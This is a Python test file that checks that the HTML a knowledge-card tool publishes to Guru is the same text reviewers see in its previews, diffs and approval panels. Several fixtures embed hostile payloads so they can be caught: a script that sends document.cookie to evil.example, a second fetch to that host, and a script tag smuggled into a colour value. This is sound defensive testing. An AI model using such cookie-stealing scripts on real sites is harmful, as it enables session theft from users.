"""The publish-body parity invariant (approve-vs-sent audit, Cluster A).

ONE function composes the bytes that reach Guru —
``enablement_store.publish_body(draft)``. This file locks that:

  (a) ``publish_draft`` ships EXACTLY ``publish_body(draft)`` — create and
      update branches alike;
  (b) every approval/review surface derives from that same string: the Qt
      preview (``guru_preview.render_preview``), the web preview
      (``WorkbenchWebController._preview_html``), and the Review-changes diff
      input (``enablement_store.review_text``);
  (c) both publish safety belts compare that same string — page.py's
      ``_web_publish_content_lookup`` and the web controller's belt;
  (d) the C1 probe: attaching a quiz to an EXISTING markdown draft must not
      replace the card body with the quiz — neither on create nor, worse, on
      the update_card branch against a live linked card.

Draft-shape matrix: markdown-only, imported content_html, rich-editor HTML,
quiz-attached-to-existing-draft, quiz-on-new-draft, guru-block directives,
empty body.

Run: python -m pytest tests/test_publish_body_parity.py -q
"""

from __future__ import annotations

import json

import pytest

from src.data import artifact_store, enablement_store as store
from src.data.chat_tools.artifact_tools import handle_attach_artifact
from src.data.html_markdown import markdown_to_html


@pytest.fixture(autouse=True)
def _no_card_style(monkeypatch):
    """Pin the WS-A1 style pass OFF for the byte-parity matrix — a machine
    with ``enablement.guru.card_style`` enabled would otherwise style every
    publish here and the byte-identity assertions would become env-dependent.
    The style pass has its own test class below (TestCardStylePass)."""
    from src.data import settings_manager
    monkeypatch.setattr(settings_manager, "get_section", lambda *a, **k: {})


# ── spies / stubs ────────────────────────────────────────────────────

class SpyGuru:
    """Records the exact bytes handed to Guru."""

    def __init__(self, card_content: str = "<p>LIVE CARD BODY</p>"):
        self.created, self.updated = [], []
        self._card_content = card_content

    def get_card(self, card_id):
        return {"id": card_id, "title": "Live card",
                "content": self._card_content}

    def create_card(self, collection_id, title, content, folder_ids=None):
        self.created.append({"collection_id": collection_id, "title": title,
                             "content": content})
        return {"id": "new-card-1"}

    def update_card(self, card_id, content, title=None):
        self.updated.append({"card_id": card_id, "content": content,
                             "title": title})
        return {"id": card_id}

    @property
    def sent(self) -> str:
        rows = self.created + self.updated
        return rows[-1]["content"] if rows else ""


class FakeBrowser:
    """Minimal QTextBrowser stand-in — render_preview only needs these."""

    def __init__(self):
        self.html = None
        self.stylesheet = None

    def document(self):
        return self

    def setDefaultStyleSheet(self, css):
        self.stylesheet = css

    def setHtml(self, html):
        self.html = html


QUIZ = {
    "title": "Knowledge check",
    "questions": [{
        "question": "Where do escalations go?",
        "choices": [{"text": "The payer desk", "correct": True},
                    {"text": "Email", "correct": False}],
        "explanation": "Never email PHI.",
    }],
}

BODY_MD = ("# Payer Escalation Policy\n\n"
           "1. Call the payer desk.\n"
           "2. Do NOT email PHI externally.\n")


def _attach_quiz(conn, *, draft_id=None, new_draft_title=None):
    aid = artifact_store.create_artifact(
        conn, kind="quiz", title="Escalation quiz",
        spec={"quiz": QUIZ, "quiz_md": "## Knowledge check\n\n- Q1"})
    args = {"artifact_id": aid}
    if draft_id is not None:
        args["draft_id"] = draft_id
    if new_draft_title is not None:
        args["new_draft_title"] = new_draft_title
    res = handle_attach_artifact(conn, args, {})
    assert res.get("ok"), res
    return res["draft_id"]


# ── the draft-shape matrix ───────────────────────────────────────────

def _matrix(conn) -> dict:
    """Every shape a draft can have when it reaches the publish path."""
    shapes = {}

    shapes["markdown_only"] = store.save_card_draft(
        conn, title="Markdown only", content=BODY_MD)

    imported = store.import_guru_card_to_draft(
        conn, SpyGuru('<h1>Imported</h1><p>Refunds within 30 days.</p>'),
        "abc123")
    assert imported["ok"], imported
    shapes["imported_content_html"] = imported["draft_id"]

    rich = store.save_card_draft(conn, title="Rich", content="colour body")
    store.update_draft_content(
        conn, rich, content="colour body",
        content_html='<p><span style="color:#cc0000">colour body</span></p>')
    shapes["rich_editor_html"] = rich

    existing = store.save_card_draft(conn, title="Existing", content=BODY_MD)
    shapes["quiz_on_existing_draft"] = _attach_quiz(conn, draft_id=existing)

    shapes["quiz_on_new_draft"] = _attach_quiz(
        conn, new_draft_title="Fresh quiz card")

    shapes["guru_blocks"] = store.save_card_draft(
        conn, title="Blocks",
        content="> [!WARNING]\n> Rollout is June 24.\n\n"
                "::: details Extra\n\nhidden body\n\n:::\n")

    shapes["empty_body"] = store.save_card_draft(conn, title="Empty", content="")
    return shapes


@pytest.fixture()
def matrix(empty_db):
    return empty_db.conn, _matrix(empty_db.conn)


# ── (a) publish_draft ships EXACTLY publish_body(draft) ──────────────

def test_create_branch_ships_publish_body_verbatim(matrix):
    conn, shapes = matrix
    for name, did in shapes.items():
        draft = store.get_draft(conn, did)
        expected = store.publish_body(draft)
        g = SpyGuru()
        res = store.publish_draft(conn, did, guru_client=g, collection_id="col1")
        assert res["ok"], (name, res)
        assert g.sent == expected, name


def test_update_branch_ships_publish_body_verbatim(matrix):
    conn, shapes = matrix
    for name, did in shapes.items():
        store.set_draft_card_id(conn, did, f"card-{did}")
        draft = store.get_draft(conn, did)
        expected = store.publish_body(draft)
        g = SpyGuru()
        assert store.publish_draft(conn, did, guru_client=g)["ok"], name
        assert g.updated and g.updated[0]["content"] == expected, name


def test_publish_body_is_the_only_composition():
    """publish_draft must not re-compose a body of its own."""
    import inspect
    src = inspect.getsource(store.publish_draft)
    assert "publish_body(draft)" in src
    assert "markdown_to_html" not in src and "expand_blocks" not in src


def test_publish_body_definition(matrix):
    """The definition itself: expand_blocks(content_html or md→html)."""
    from src.data.guru_blocks import expand_blocks
    conn, shapes = matrix
    for name, did in shapes.items():
        d = store.get_draft(conn, did)
        expected = expand_blocks(d.get("content_html")
                                 or markdown_to_html(d.get("content") or ""))
        assert store.publish_body(d) == expected, name
    assert store.publish_body(None) == ""


def test_guru_block_directives_are_expanded_in_the_shipped_bytes(matrix):
    conn, shapes = matrix
    body = store.publish_body(store.get_draft(conn, shapes["guru_blocks"]))
    assert "ghq-card-content__callout" in body
    assert "ghq-card-content__collapsible" in body


# ── (b) every approval surface derives from the same string ──────────

def test_qt_preview_renders_the_publish_body(matrix):
    from src.ui.pages.enablement.guru_preview import render_preview
    conn, shapes = matrix
    for name, did in shapes.items():
        d = store.get_draft(conn, did)
        b = FakeBrowser()
        render_preview(b, d.get("content") or "", d.get("content_html"))
        assert b.html == store.publish_body(d), name


def test_qt_preview_shows_content_html_the_markdown_never_had(matrix):
    """C2's probe, inverted: what only exists in content_html must now be on
    the review surface, because that is what ships."""
    from src.ui.pages.enablement.guru_preview import render_preview
    conn, shapes = matrix
    d = store.get_draft(conn, shapes["quiz_on_existing_draft"])
    b = FakeBrowser()
    render_preview(b, d.get("content") or "", d.get("content_html"))
    assert "Knowledge check" in b.html
    assert "Do NOT email PHI externally" in b.html


def test_workbench_render_body_passes_the_content_html():
    """The Qt call site must hand render_preview both halves — passing only the
    markdown is exactly how the preview and the payload drifted apart."""
    import inspect
    from src.ui.pages.enablement import expand_overlay, workbench
    assert ("render_preview(self._body, self._current_md, self._current_html)"
            in inspect.getsource(workbench.WorkbenchPage._render_body))
    assert ("render_preview(self._preview, self._md, self._html)"
            in inspect.getsource(expand_overlay.ExpandOverlay._render_preview))


class _FakeItem:
    """A QTableWidgetItem stand-in — _on_draft_selected only reads these."""

    def __init__(self, text="", data=None):
        self._text, self._data = text, data

    def text(self):
        return self._text

    def data(self, role):
        return self._data


class _FakeTable:
    def __init__(self, items):
        self._items = items

    def item(self, row, col):
        return self._items.get((row, col))


class _FakeButton:
    def __init__(self):
        self.enabled = None

    def setEnabled(self, value):
        self.enabled = value


class _FakePreview:
    def __init__(self):
        self.text = None

    def setPlainText(self, value):
        self.text = value


class _FakePipeline:
    def __init__(self, draft):
        self._draft = draft

    def _get_draft(self, draft_id):
        return self._draft


def test_legacy_guru_page_preview_is_the_publish_body(matrix):
    """C4, on the LEGACY approval surface.

    ``guru_page`` previewed ``draft["content"]`` — the markdown COLUMN — while
    ``guru_content_pipeline.approve_and_push`` shipped ``publish_body(draft)``.
    Observed: the reviewer read "Benign markdown the reviewer reads." and a
    <script> in ``content_html`` went out over the wire. Called with a fake
    self so no Qt widget tree is needed; duck typing is the whole point.
    """
    from src.ui.pages.guru_page import GuruPage
    conn, _shapes = matrix
    hostile = ('<p>Benign markdown the reviewer reads.</p>'
               '<script>fetch("https://evil.example/"+document.cookie)</script>')
    did = store.save_card_draft(conn, title="Legacy",
                                content="Benign markdown the reviewer reads.")
    store.update_draft_content(conn, did,
                               content="Benign markdown the reviewer reads.",
                               content_html=hostile)
    draft = store.get_draft(conn, did)

    from PySide6.QtCore import Qt
    page = type("FakeGuruPage", (), {})()
    page._drafts_table = _FakeTable({
        (0, 0): _FakeItem("Legacy", did),
        (0, 3): _FakeItem("PENDING"),
    })
    page._approve_btn, page._reject_btn = _FakeButton(), _FakeButton()
    page._draft_preview = _FakePreview()
    page._content_pipeline = _FakePipeline(draft)
    page._current_draft_id = None
    assert Qt.ItemDataRole.UserRole is not None   # the role the id rides on

    GuruPage._on_draft_selected(page, 0, 0, -1, -1)

    assert page._draft_preview.text == store.publish_body(draft)
    assert "evil.example" in page._draft_preview.text, (
        "the shipped bytes must be on the surface that gates the push")
    assert page._draft_preview.text != (draft.get("content") or "")


def test_web_preview_is_the_sanitized_publish_body(matrix):
    from src.data.html_sanitize import sanitize_html
    from src.services.enablement_web import WorkbenchWebController
    conn, shapes = matrix
    ctrl = WorkbenchWebController()
    for name, did in shapes.items():
        d = store.get_draft(conn, did)
        card = {"markdown": d.get("content") or "",
                "content_html": d.get("content_html")}
        assert ctrl._publish_body(card) == store.publish_body(d), name
        assert ctrl._preview_html(card) == sanitize_html(store.publish_body(d)), name


def test_review_text_tracks_the_publish_body(matrix):
    """The diff input: markdown verbatim when the shipped bytes are derived
    from it, else the down-converted publish body."""
    from src.data.html_markdown import html_to_markdown
    conn, shapes = matrix
    for name, did in shapes.items():
        d = store.get_draft(conn, did)
        if d.get("content_html"):
            assert store.review_text(d) == html_to_markdown(store.publish_body(d)), name
        else:
            assert store.review_text(d) == (d.get("content") or ""), name


def test_review_text_reveals_a_body_the_markdown_column_hides(matrix):
    conn, shapes = matrix
    d = store.get_draft(conn, shapes["imported_content_html"])
    # the import stored the card's ORIGINAL html; the diff must be of that
    assert "Refunds within 30 days" in store.review_text(d)


def test_web_diff_input_uses_review_text():
    import inspect
    from src.services.enablement_web import WorkbenchWebController
    src = inspect.getsource(WorkbenchWebController.js_request_diff)
    assert "review_text" in src and 'card.get("markdown") or ""' in src
    qt = inspect.getsource(
        __import__("src.ui.pages.enablement.workbench", fromlist=["x"]).WorkbenchPage._set_view)
    assert "self._review_text()" in qt


# ── (c) the belts certify that same string ───────────────────────────

def test_page_belt_lookup_returns_the_publish_body(matrix):
    from src.ui.pages.enablement.page import EnablementPage
    conn, shapes = matrix

    class Shim:
        def _conn(self):
            return conn

    shim = Shim()
    for name, did in shapes.items():
        got = EnablementPage._web_publish_content_lookup(shim, did)
        assert got == store.publish_body(store.get_draft(conn, did)), name


def test_web_belt_refuses_when_only_content_html_diverges(matrix):
    """The belt's whole purpose: cache and DB agree on markdown but not on the
    field that ships → refuse. Pre-fix this published."""
    from src.services.enablement_web import WorkbenchWebController
    conn, shapes = matrix
    did = shapes["markdown_only"]
    # DB body carries a rider the cached (previewed) card does not
    store.update_draft_content(conn, did, content=BODY_MD,
                               content_html=markdown_to_html(BODY_MD)
                               + "<p>INTERNAL: rates drop 40% on Aug 1</p>")
    published = []
    ctrl = WorkbenchWebController(
        publish_confirm_fn=lambda dest, title: True,
        content_lookup=lambda d: store.publish_body(store.get_draft(conn, int(d))))
    ctrl.publish_requested.connect(lambda d: published.append(d))
    ctrl.set_pending_drafts([{"id": did, "title": "T", "source": "drive"}],
                            active_id=did)
    ctrl.show_draft({"title": "T", "markdown": BODY_MD})   # no content_html
    ctrl.js_request_publish("guru_new")
    assert published == []


def test_web_belt_allows_when_the_publish_bodies_agree(matrix):
    from src.services.enablement_web import WorkbenchWebController
    conn, shapes = matrix
    did = shapes["markdown_only"]
    published = []
    ctrl = WorkbenchWebController(
        publish_confirm_fn=lambda dest, title: True,
        content_lookup=lambda d: store.publish_body(store.get_draft(conn, int(d))))
    ctrl.publish_requested.connect(lambda d: published.append(d))
    ctrl.set_pending_drafts([{"id": did, "title": "T", "source": "drive"}],
                            active_id=did)
    ctrl.show_draft({"title": "T", "markdown": BODY_MD})
    ctrl.js_request_publish("guru_new")
    assert published == ["guru_new"]


# ── (d) C1: an attached artifact must never BE the body ──────────────

def test_quiz_attach_keeps_the_original_body_in_the_sent_bytes(empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Payer Escalation Policy",
                                content=BODY_MD)
    _attach_quiz(conn, draft_id=did)
    draft = store.get_draft(conn, did)
    g = SpyGuru()
    assert store.publish_draft(conn, did, guru_client=g, collection_id="c")["ok"]
    sent = g.created[0]["content"]
    # the exact audit probe
    assert "Do NOT email PHI externally" in sent
    assert "Knowledge check" in sent
    assert sent == store.publish_body(draft)


def test_quiz_attach_does_not_overwrite_a_linked_live_card(empty_db):
    """The destructive variant: draft linked to a live card → update_card must
    receive body + quiz, never the quiz alone."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Payer Escalation Policy",
                                content=BODY_MD)
    store.set_draft_card_id(conn, did, "live-card-9")
    _attach_quiz(conn, draft_id=did)
    g = SpyGuru()
    assert store.publish_draft(conn, did, guru_client=g)["ok"]
    sent = g.updated[0]["content"]
    assert g.updated[0]["card_id"] == "live-card-9"
    assert "Call the payer desk" in sent and "Do NOT email PHI externally" in sent
    assert not sent.lstrip().startswith("<h2>Knowledge check</h2>")


def test_quiz_attach_seeds_content_html_from_the_markdown(empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content=BODY_MD)
    _attach_quiz(conn, draft_id=did)
    html = store.get_draft(conn, did)["content_html"]
    assert html.startswith(markdown_to_html(BODY_MD))


def test_quiz_on_a_new_draft_is_unchanged(empty_db):
    """The new_draft_title branch was always consistent — keep it that way:
    content_html is the quiz section alone, matching the quiz-only markdown."""
    conn = empty_db.conn
    did = _attach_quiz(conn, new_draft_title="Fresh quiz card")
    d = store.get_draft(conn, did)
    assert d["content_html"].startswith("<h2>Knowledge check</h2>")
    assert "Knowledge check" in d["content"]
    g = SpyGuru()
    store.publish_draft(conn, did, guru_client=g, collection_id="c")
    assert g.created[0]["content"] == store.publish_body(d)


def test_second_attach_appends_rather_than_replaces(empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content=BODY_MD)
    _attach_quiz(conn, draft_id=did)
    first = store.get_draft(conn, did)["content_html"]
    _attach_quiz(conn, draft_id=did)
    second = store.get_draft(conn, did)["content_html"]
    assert second.startswith(first)
    assert second.count("<h2>Knowledge check</h2>") == 2


def test_non_html_artifacts_still_clear_stale_html(empty_db):
    """diagram / one_pager pass content_html=None so update_draft_content
    clears it — the markdown stays canonical. Unchanged by this fix."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content=BODY_MD,
                                content_html="<p>stale</p>")
    aid = artifact_store.create_artifact(
        conn, kind="diagram", title="Flow", spec={"mermaid": "graph TD;A-->B;"})
    res = handle_attach_artifact(conn, {"artifact_id": aid, "draft_id": did}, {})
    assert res["ok"], res
    d = store.get_draft(conn, did)
    assert d["content_html"] is None
    assert "mermaid" in d["content"]
    assert store.publish_body(d) == markdown_to_html(d["content"])


# ── (e) the third approval surface: the in-chat review panel ─────────
#
# The Qt preview, the web preview and the Review-changes diff were routed
# through publish_body/review_text on 2026-07-26; the in-chat "Approve and
# publish" panel was not, and it gates EVERY chat-initiated push
# (require_approval defaults to 1). Full traced-chain coverage lives in
# tests/test_chat_review_panel.py — these lock the parity contract itself.

def test_chat_panel_diff_input_is_review_text():
    import inspect
    from src.services.agent_chat import AgentChatController
    src = inspect.getsource(AgentChatController.pending_drafts)
    assert "store.review_text(d)" in src and "store.publish_body(d)" in src
    assert 'proposed = d.get("content")' not in src


def test_chat_panel_names_what_the_projection_drops(matrix):
    """review_text is lossy for a content_html draft; the panel must say so
    rather than present the projection as the whole story."""
    from src.services.agent_chat import review_notice
    conn, shapes = matrix
    d = store.get_draft(conn, shapes["imported_content_html"])
    store.update_draft_content(
        conn, shapes["imported_content_html"],
        content=d.get("content") or "",
        content_html=(d.get("content_html") or "")
        + '<script>fetch("//evil.example")</script>')
    d = store.get_draft(conn, shapes["imported_content_html"])
    body, reviewed = store.publish_body(d), store.review_text(d)
    assert "evil.example" in body and "evil.example" not in reviewed
    assert "evil.example" in review_notice(reviewed, body)


def test_chat_panel_is_silent_when_review_text_is_complete(matrix):
    """The markdown shapes: the shipped bytes are a pure function of the
    reviewed text, so there is nothing to disclose."""
    from src.services.agent_chat import review_notice
    conn, shapes = matrix
    for name in ("markdown_only", "guru_blocks", "empty_body"):
        d = store.get_draft(conn, shapes[name])
        assert review_notice(store.review_text(d), store.publish_body(d)) == "", name


# ── (f) guru_content_pipeline composes nothing of its own ────────────

def test_content_pipeline_calls_publish_body():
    import inspect
    from src.data.guru_content_pipeline import GuruContentPipeline
    src = inspect.getsource(GuruContentPipeline.approve_and_push)
    assert "publish_body(draft)" in src
    code = "\n".join(l for l in src.splitlines() if not l.strip().startswith("#"))
    assert "markdown_to_html" not in code and "expand_blocks" not in code


def test_content_pipeline_ships_the_publish_body(empty_db, monkeypatch):
    """Behavioural: a draft whose body lives in content_html must reach Guru as
    those bytes — the hand-rolled composition read a draft dict that never even
    carried the column."""
    from src.data.guru_content_pipeline import GuruContentPipeline
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Rewrite me", content=BODY_MD,
                                draft_type="rewrite")
    store.set_draft_card_id(conn, did, "card-42")
    store.update_draft_content(
        conn, did, content=BODY_MD,
        content_html=markdown_to_html(BODY_MD) + "<p>only in the HTML</p>")
    monkeypatch.setattr(GuruContentPipeline, "_record_baseline",
                        lambda self, *a, **k: None)
    g = SpyGuru()
    assert GuruContentPipeline(empty_db, g).approve_and_push(did) is True
    assert g.updated[0]["content"] == store.publish_body(store.get_draft(conn, did))
    assert "only in the HTML" in g.updated[0]["content"]


# ── shape sanity: the matrix really does cover both representations ──

def test_matrix_covers_both_representations(matrix):
    conn, shapes = matrix
    with_html = {n for n, did in shapes.items()
                 if store.get_draft(conn, did).get("content_html")}
    assert {"imported_content_html", "rich_editor_html",
            "quiz_on_existing_draft", "quiz_on_new_draft"} <= with_html
    assert {"markdown_only", "guru_blocks", "empty_body"} & with_html == set()
    # and the JSON-serialisable spy really recorded bytes
    assert json.dumps(list(shapes))


# ── WS-A1 (pilot feedback): the deterministic card-style pass ─────────

_STYLE = {"heading_color": "#0055CC", "link_color": "#0055CC"}


class TestCardStylePass:
    def test_disabled_is_byte_identical(self):
        d = {"content": "# Head\n[link](https://x.example)"}
        assert store.publish_body(d, card_style=False) == store.publish_body(d)

    def test_headings_and_links_get_span_wrapped(self):
        d = {"content": "## Setup Steps\n\nSee [the guide](https://x.example)."}
        body = store.publish_body(d, card_style=_STYLE)
        assert '<h2><span style="color:#0055CC">Setup Steps</span></h2>' in body
        assert '><span style="color:#0055CC">the guide</span></a>' in body
        # the style NEVER rides the heading/anchor tag itself (sanitizer drops it there)
        assert '<h2 style' not in body and '<a style' not in body

    def test_idempotent(self):
        from src.data.html_markdown import apply_guru_card_styles
        d = {"content": "# T\n[l](https://x.example)"}
        once = store.publish_body(d, card_style=_STYLE)
        twice = apply_guru_card_styles(once, heading_color="#0055CC",
                                       link_color="#0055CC")
        assert twice == once

    def test_merge_aware_author_color_wins(self):
        d = {"content_html":
             '<h2><span style="color:#BB0000">Author red</span></h2>'}
        body = store.publish_body(d, card_style=_STYLE)
        assert body.count("<span") == 1          # no second wrapper
        assert "#BB0000" in body and "#0055CC" not in body

    def test_web_preview_sanitizer_keeps_the_color(self):
        from src.data.html_sanitize import sanitize_html
        d = {"content": "## Colored Heading"}
        cleaned = sanitize_html(store.publish_body(d, card_style=_STYLE))
        assert "color:#0055CC" in cleaned.replace(" ", "")

    def test_invalid_hex_fails_closed(self):
        from src.data.html_markdown import apply_guru_card_styles
        html = "<h2>T</h2>"
        bad = apply_guru_card_styles(
            html, heading_color='#00C"><script>', link_color="#0055CC")
        assert bad == html

    def test_publish_ships_styled_bytes_when_enabled(self, empty_db, monkeypatch):
        """The create branch sends EXACTLY the styled publish_body when the
        settings preset is enabled — reviewed-bytes == shipped-bytes holds."""
        from src.data import settings_manager
        monkeypatch.setattr(
            settings_manager, "get_section",
            lambda *a, **k: {"guru": {"card_style": {"default": {
                "enabled": True, "heading_color": "#0055CC",
                "link_color": "#0055CC"}}}})
        conn = empty_db.conn
        did = store.save_card_draft(conn, title="Styled",
                                    content="## Head\n\nbody")
        store.approve_draft(conn, did, approved_by="reviewer")
        spy = SpyGuru()
        out = store.publish_draft(conn, did, guru_client=spy,
                                  collection_id="coll-1")
        assert out["ok"]
        assert spy.sent == store.publish_body(store.get_draft(conn, did))
        assert '<span style="color:#0055CC">Head</span>' in spy.sent
